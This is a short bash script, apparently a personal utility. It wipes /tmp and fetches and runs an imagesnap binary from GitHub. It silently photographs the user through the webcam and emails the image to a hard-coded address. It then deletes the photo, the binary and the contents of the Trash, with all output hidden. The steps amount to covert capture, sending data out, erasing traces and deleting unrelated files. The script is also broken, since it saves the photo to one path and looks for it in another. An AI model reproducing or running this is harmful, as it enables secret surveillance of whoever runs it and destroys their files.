#!/bin/bash

# Created by Austin Harshberger (2018)

# Temp to store filename
FILENAME=""

# Clear tmp
cd /tmp
rm -rf *

# Modify to be email the image should be sent to
EMAIL_TO_SEND="austin.harshberger@akqa.com"

# Download imagesnap
curl -o /tmp/imagesnap -L "https://github.com/aharshbe/automated_webcam_taker/raw/master/imagesnap" > /dev/null 2>&1

# Make executable 
chmod u+x /tmp/imagesnap > /dev/null 2>&1

# Take a picture and store it in tmp
/tmp/imagesnap -w 1 ~/Desktop/test.jpg > /dev/null 2>&1

# List tmp
FILENAME="$(ls snap*)"

# Email photo 
uuencode /tmp/$FILENAME $FILENAME | mail -s "photo of me" $EMAIL_TO_SEND > /dev/null 2>&1

# Delete photo 
rm -rf /tmp/$FILENAME > /dev/null 2>&1

# Delete imagesnap
rm -rf /tmp/imagesnap > /dev/null 2>&1

# Clear trash
rm -rf ~/.Trash*/ > /dev/null 2>&1
